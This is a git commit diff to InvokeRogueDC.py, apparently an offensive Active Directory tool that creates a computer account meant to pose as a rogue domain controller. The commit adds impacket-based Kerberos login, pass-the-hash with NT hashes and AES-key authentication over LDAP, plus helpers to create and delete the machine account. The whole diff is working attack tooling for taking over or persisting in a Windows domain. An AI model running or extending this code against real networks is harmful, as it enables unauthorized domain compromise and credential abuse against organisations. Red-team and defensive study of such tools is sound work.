cba99d8dd8ed3aa624af44c7a64ab1d2602feb5d
Wuentin <quentindamour1403@gmail.com>
2025-02-01 14:46:15 +0100

    Kerberos auth
    I've added impacket kerberos authentication.

--- InvokeRogueDC.py
+++ InvokeRogueDC.py
@@ -1,12 +1,23 @@
 import argparse
 import os
+import ldap3
 from ldap3 import Server, Connection, NTLM, SASL, KERBEROS, ALL, MODIFY_ADD, SUBTREE
 from ldap3.core.exceptions import LDAPBindError
 from gssapi import Credentials
 import random
 import string
+from impacket.krb5.ccache import CCache
+from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5 import constants
+from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from pyasn1.codec.ber import encoder, decoder
+from pyasn1.type.univ import noValue
+import datetime
+from binascii import unhexlify
 
-def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, domain, kerberos):
+def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, aesKey ,domain, kerberos):
     """
     Connect to an LDAP server using NTLM or Kerberos authentication.
     """
@@ -24,14 +35,16 @@ def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, doma
         use_start_tls = True
 
     server = Server(server_url, use_ssl=use_ssl, get_info=ALL)
-
     # NTLM authentication
     if kerberos == False:
         user_dn_ntlm = f"{domain}\\{username}"
 
         if not (password or nthash):
             raise ValueError("[-] Password or NT hash is required for NTLM authentication.")
+            
         if nthash:
+            if len(nthash)!=32 and not nthash=='':
+                raise ValueError("[-] Invalid NT hash.")
             password = "aad3b435b51404eeaad3b435b51404ee" + ":" + nthash
 
         try:
@@ -46,25 +59,89 @@ def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, doma
 
     # Kerberos authentication
     elif kerberos:
-        user_dn_kerberos = f"{username}@{domain}"
-        ccache = os.getenv("KRB5CCNAME")
-        if not ccache:
-            raise ValueError("[-] KRB5CCNAME is not set. Please specify the Kerberos cache file path.")
-        print("Need to work on that, not implemented yet.")
-        #try:
-        #    creds = Credentials(usage="initiate", store={"ccache": ccache})
-        #    with Connection(server, user=user_dn_kerberos, authentication=SASL, sasl_mechanism=KERBEROS,
-        #                    sasl_credentials=(None, None, creds), auto_bind=True) as conn:
-        #        if use_start_tls:
-        #            conn.start_tls()
-        #        print("[+] Successfully authenticated using Kerberos.")
-        #        return conn
-        #except LDAPBindError as e:
-        #    print(f"[-] Kerberos authentication failed: {e}")
-        #    return None
-
+        #Kerberos with ldap-starttls not working (╯°□°）╯︵ ┻━┻
+        conn = Connection(server, authentication=SASL, sasl_mechanism='GSS-SPNEGO')
+        if not LDAP3KerberosLogin(conn, username, password, domain, nthash, aesKey):
+            raise Exception("[-] Kerberos authentication failed.")
+        print("[+] Successfully authenticated using Kerberos.")
+        return conn
     else:
         raise ValueError("[-] Invalid authentication method. Choose NTLM or Kerberos.")
+
+def LDAP3KerberosLogin(connection, user, password, domain='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
+    """
+    Kerberos authentication using Impacket.
+    """
+    if len(nthash)!=32 and not nthash=='':
+        raise ValueError("[-] Invalid NT hash.")
+    try:
+        nthash = unhexlify(nthash)
+    except TypeError:
+        pass
+    
+    targetName = f'ldap/{connection.server.host}'
+
+    if useCache:
+        domain, user, TGT, TGS = CCache.parseFile(domain, user, targetName)
+    
+    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    if TGT is None:
+        if TGS is None:
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, None, nthash, aesKey, kdcHost)
+            
+    else:
+            tgt = TGT['KDC_REP']
+            cipher = TGT['cipher']
+            sessionKey = TGT['sessionKey']
+
+    if TGS is None:
+            serverName = Principal(targetName, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
+    else:
+            tgs = TGS['KDC_REP']
+            cipher = TGS['cipher']
+            sessionKey = TGS['sessionKey']
+
+    blob = SPNEGO_NegTokenInit()
+
+    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
+
+    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+    ticket = Ticket()
+    ticket.from_asn1(tgs['ticket'])
+
+    apReq = AP_REQ()
+    apReq['pvno'] = 5
+    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+    apReq['ap-options'] = constants.encodeFlags([])
+    seq_set(apReq, 'ticket', ticket.to_asn1)
+
+    authenticator = Authenticator()
+    authenticator['authenticator-vno'] = 5
+    authenticator['crealm'] = domain
+    seq_set(authenticator, 'cname', userName.components_to_asn1)
+    now = datetime.datetime.now(datetime.timezone.utc)
+    authenticator['cusec'] = now.microsecond
+    authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+    encodedAuthenticator = encoder.encode(authenticator)
+    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
+    apReq['authenticator'] = noValue
+    apReq['authenticator']['etype'] = cipher.enctype
+    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+    blob['MechToken'] = encoder.encode(apReq)
+
+    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO', blob.getData())
+    if connection.closed:
+        connection.open(read_server_info=False)
+
+    connection.sasl_in_progress = True
+    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
+    connection.sasl_in_progress = False
+    if response[0]['result'] != 0:
+        raise Exception(response)
+    connection.bound = True
+    return True
 
 def ldap_computer_exist(conn, computer_name, domain):
     """
@@ -125,6 +202,9 @@ def ldap_create_computer(conn, computer_name, computer_pass, domain):
         print(f"[-] Failed to create computer account: {e}")
 
 def generatePassword():
+    """
+    Create a password.
+    """
     return ''.join(random.choice(string.ascii_uppercase + string.digits+ string.punctuation + string.ascii_lowercase)  for _ in range(32))
 
 def delete_computer(conn,computer_name,domain):
@@ -183,10 +263,11 @@ def invoke_ascii_art():
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Create a computer account that will act as a domain controller.")
     parser.add_argument("--dc-host", required=True, help="Domain Controller.")
-    parser.add_argument("--ldap-encryption", default="ldap-starttls", choices=["ldaps", "ldap-starttls"], help="LDAP encryption method (Default : ldap-starttls).")
+    parser.add_argument("--ldap-encryption", default="ldaps", choices=["ldaps", "ldap-starttls"], help="LDAP encryption method (Default : ldaps).")
     parser.add_argument("--username", "-u", required=True, help="Username for authentication.")
     parser.add_argument("--password", "-p", help="Password for NTLM authentication.")
-    parser.add_argument("--nthash", "-H", help="NT hash for NTLM authentication.")
+    parser.add_argument("--nthash", "-H",default='',help="NT hash for NTLM authentication.")
+    parser.add_argument("--aesKey", help="AES key to use for Kerberos Authentication")
     parser.add_argument("--domain", "-d", required=True, help="Domain name for authentication.")
     parser.add_argument("--kerberos","-k", default=False,action='store_true', help="Use Kerberos authentication instead NTLM. NOT YET IMPLEMENTED!")
     parser.add_argument("--computer", required=True, help="Name of the computer to create in LDAP.")
@@ -199,7 +280,7 @@ if __name__ == "__main__":
     
 
     try:
-        conn = ldap_authentication(args.dc_host, args.ldap_encryption, args.username, args.password, args.nthash, args.domain, args.kerberos)
+        conn = ldap_authentication(args.dc_host, args.ldap_encryption, args.username, args.password, args.nthash, args.aesKey, args.domain, args.kerberos)
         if conn:
             print("[+] Successfully connected to the LDAP server.")
             if (args.delete):
